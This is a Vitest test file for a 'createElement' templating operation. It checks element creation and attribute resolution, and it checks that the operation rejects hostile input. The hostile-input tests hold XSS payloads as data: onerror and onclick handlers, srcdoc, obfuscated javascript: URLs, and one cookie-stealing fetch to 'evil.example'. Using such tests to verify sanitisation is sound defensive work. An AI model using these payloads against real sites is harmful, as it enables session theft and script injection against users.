import type {IEventbus} from '@eventbus/index.ts';
import {createElement} from '@operation/create-element.ts';
import type {IOperationScope} from '@operation/index.ts';
import {applyOperation} from '@util/apply-operation.ts';
import {describe, expect, test} from 'vitest';

describe('createElement', () => {
  test('should create a simple element', () => {
    // given
    const operationData = {elementName: 'div'};

    // test
    const newData = applyOperation(createElement, operationData);

    // expect
    expect(newData.template.prop('outerHTML')).toBe('<div></div>');
  });
  test('should create a simple element with text', () => {
    // given
    const operationData = {elementName: 'div', text: 'test'};

    // test
    const newData = applyOperation(createElement, operationData);

    // expect
    expect(newData.template.prop('outerHTML')).toBe('<div>test</div>');
  });
  test('should create an element with attributes', () => {
    // given
    const operationData = {
      elementName: 'div',
      attributes: {
        class: 'test',
        id: 'testmore',
      },
    };

    // test
    const newData = applyOperation(createElement, operationData);

    // expect
    expect(newData.template.prop('outerHTML')).toBe(
      '<div class="test" id="testmore"></div>'
    );
  });
  test('should create an element with attributes and text', () => {
    // given
    const operationData = {
      elementName: 'div',
      attributes: {
        class: 'testClass',
        id: 'testId',
      },
      text: 'test text',
    };

    // test
    const newData = applyOperation(createElement, operationData);

    // expect
    expect(newData.template.prop('outerHTML')).toBe(
      '<div class="testClass" id="testId">test text</div>'
    );
  });
  test('should create an element with resolved attributes and text', () => {
    // given
    const operationData = {
      elementName: 'div',
      className: 'resolved-class',
      attributes: {
        class: '$operationdata.className',
        id: 'testId',
      },
      text: '$scope.currentItem.label',
    };

    const scope: IOperationScope = {
      currentIndex: 0,
      eventbus: {} as IEventbus,
      operations: [],
      currentItem: {
        label: 'foo bar',
      },
    };

    // test
    const newData = applyOperation(createElement, operationData, scope);

    // expect
    expect(newData.template.prop('outerHTML')).toBe(
      '<div class="resolved-class" id="testId">foo bar</div>'
    );
  });
  test('should create an element with attributes but ignore attribute values that are undefined', () => {
    // given
    const operationData = {
      elementName: 'div',
      attributes: {
        class: undefined,
        id: 'testId',
      },
      text: 'test text',
    };

    // test
    const newData = applyOperation(createElement, operationData);

    // expect
    expect(newData.template.prop('outerHTML')).toBe(
      '<div id="testId">test text</div>'
    );
  });

  test('should remove elementName, attributes and text properties from operation data', () => {
    // given
    const operationData = {
      elementName: 'div',
      attributes: {
        class: undefined,
        id: 'testId',
      },
      text: 'test text',
    };

    // test
    const newData = applyOperation(createElement, operationData);

    // expect
    expect('elementName' in newData).toBe(false);
    expect('attributes' in newData).toBe(false);
    expect('text' in newData).toBe(false);
  });

  test('given text resolved from operation data containing markup, when createElement is called, then the markup is set as text and not parsed', () => {
    // given
    const payload = '<img src=x onerror=alert(1)>';
    const operationData = {
      elementName: 'div',
      queryParams: {name: payload},
      text: '$operationdata.queryParams.name',
    };

    // test
    const newData = applyOperation(createElement, operationData);

    // expect
    expect(newData.template.find('img').length).toBe(0);
    expect(newData.template.children().length).toBe(0);
    expect(newData.template.text()).toBe(payload);
  });

  test('given an attribute value containing a quote, when createElement is called, then it cannot break out of the attribute', () => {
    // given
    const payload = 'x" onmouseover="alert(1)';
    const operationData = {
      elementName: 'div',
      attributes: {
        title: payload,
      },
    };

    // test
    const newData = applyOperation(createElement, operationData as any);

    // expect
    expect(newData.template.attr('onmouseover')).toBeUndefined();
    expect(newData.template.attr('title')).toBe(payload);
  });

  test('given an invalid element name, when createElement is called, then it throws an error naming the operation', () => {
    // given
    const operationData = {
      elementName: 'img src=x onerror=alert(1)',
    };

    // test + expect
    expect(() => applyOperation(createElement, operationData as any)).toThrow(
      /createElement/
    );
  });

  test('given a custom element name, when createElement is called, then the element is created', () => {
    // given
    const operationData = {elementName: 'my-widget'};

    // test
    const newData = applyOperation(createElement, operationData as any);

    // expect
    expect(newData.template.prop('outerHTML')).toBe('<my-widget></my-widget>');
  });

  test('given unrelated operation data holding property chain strings, when createElement is called, then only elementName, attributes and text are resolved', () => {
    // given
    const operationData = {
      elementName: '$operationdata.tag',
      tag: 'section',
      label: 'resolved label',
      attributes: {title: '$operationdata.label'},
      passThrough: '$operationdata.label',
      nested: {chain: '$scope.currentItem.label'},
    };
    const scope: IOperationScope = {
      currentIndex: 0,
      eventbus: {} as IEventbus,
      operations: [],
      currentItem: {label: 'from scope'},
    };

    // test
    const newData: any = applyOperation(
      createElement,
      operationData as any,
      scope
    );

    // expect
    expect(newData.template.prop('outerHTML')).toBe(
      '<section title="resolved label"></section>'
    );
    expect(newData.passThrough).toBe('$operationdata.label');
    expect(newData.nested).toEqual({chain: '$scope.currentItem.label'});
  });
});

describe('createElement with hostile names and values', () => {
  const pwned = () => (globalThis as any).__pwned;

  test.each(['script', 'SCRIPT', 'Script'])(
    'given elementName %s, when createElement runs, then it throws naming the operation',
    elementName => {
      expect(() =>
        applyOperation(createElement, {
          elementName,
          text: 'globalThis.__pwned = true',
        } as any)
      ).toThrow(
        "createElement: elementName 'script' is not allowed, configuration may not create scripts"
      );
    }
  );

  test('given an elementName resolved from user data to script, when createElement runs, then it throws and no script is created', () => {
    // given
    const queryParams = JSON.parse(
      '{"tag": "script", "body": "globalThis.__pwned = true"}'
    );

    // test & expect
    expect(() =>
      applyOperation(createElement, {
        elementName: '$operationdata.queryParams.tag',
        text: '$operationdata.queryParams.body',
        queryParams,
      } as any)
    ).toThrow(/createElement: elementName 'script' is not allowed/);
    expect(document.querySelectorAll('script').length).toBe(0);
    expect(pwned()).toBeUndefined();
  });

  test.each([
    ['onerror', 'img', 'globalThis.__pwned = true'],
    ['onclick', 'button', 'globalThis.__pwned = true'],
    ['ONLOAD', 'iframe', 'globalThis.__pwned = true'],
    ['onanimationend', 'div', 'globalThis.__pwned = true'],
    ['srcdoc', 'iframe', '<script>globalThis.__pwned = true</script>'],
    ['SrcDoc', 'iframe', '<img src=x onerror="globalThis.__pwned = true">'],
  ])(
    'given attribute %s on a %s element, when createElement runs, then it throws naming the operation and the attribute',
    (attribute, elementName, value) => {
      expect(() =>
        applyOperation(createElement, {
          elementName,
          attributes: {[attribute]: value},
        } as any)
      ).toThrow(
        `createElement: attribute '${attribute}' is not allowed. Event handler (on*) and srcdoc attributes are refused.`
      );
      expect(pwned()).toBeUndefined();
    }
  );

  test.each([
    ['a', 'href', 'javascript:globalThis.__pwned = true'],
    ['a', 'href', ' JavaScript:globalThis.__pwned = true'],
    ['a', 'href', 'java\tscript:globalThis.__pwned = true'],
    ['a', 'href', '\u0000javascript:globalThis.__pwned = true'],
    ['iframe', 'src', 'javascript:globalThis.__pwned = true'],
    ['form', 'action', 'javascript:globalThis.__pwned = true'],
    ['button', 'formaction', 'vbscript:msgbox(1)'],
    ['object', 'data', 'javascript:globalThis.__pwned = true'],
  ])(
    'given a %s element with %s %j, when createElement runs, then it throws naming the operation and the attribute',
    (elementName, attribute, value) => {
      expect(() =>
        applyOperation(createElement, {
          elementName,
          attributes: {[attribute]: value},
        } as any)
      ).toThrow(
        `createElement: attribute '${attribute}' must not hold a javascript: or vbscript: URL.`
      );
    }
  );

  test('given an href resolved from query params holding a javascript: URL, when createElement runs, then it throws without leaking the value into the message', () => {
    // given
    const payload =
      'javascript:fetch("https://evil.example/?c="+document.cookie)';

    // test
    let error: any;
    try {
      applyOperation(createElement, {
        elementName: 'a',
        attributes: {href: '$operationdata.queryParams.next'},
        queryParams: {next: payload},
      } as any);
    } catch (e) {
      error = e;
    }

    // expect
    expect(error.message).toBe(
      "createElement: attribute 'href' must not hold a javascript: or vbscript: URL."
    );
    expect(error.message).not.toContain('evil.example');
  });

  test.each([
    ['a', 'href', 'https://example.com/page'],
    ['a', 'href', '#section-2'],
    ['a', 'href', 'mailto:info@example.com'],
    ['img', 'src', 'images/logo.png'],
    ['img', 'src', 'data:image/png;base64,iVBORw0KGgo='],
    ['iframe', 'src', 'https://www.youtube.com/embed/abc'],
    ['a', 'title', 'javascript: the good parts'],
  ])(
    'given a %s element with %s %j, when createElement runs, then the attribute is set',
    (elementName, attribute, value) => {
      const newData = applyOperation(createElement, {
        elementName,
        attributes: {[attribute]: value},
      } as any);

      expect(newData.template.attr(attribute)).toBe(value);
    }
  );

  test('given a refused attribute next to allowed ones, when createElement runs, then it throws and no template is assigned', () => {
    // given
    const operationData: any = {
      elementName: 'img',
      attributes: {src: 'logo.png', alt: 'Logo', onerror: 'alert(1)'},
    };

    // test & expect
    expect(() => applyOperation(createElement, operationData)).toThrow(
      "createElement: attribute 'onerror' is not allowed"
    );
    expect(operationData.template).toBeUndefined();
  });
});
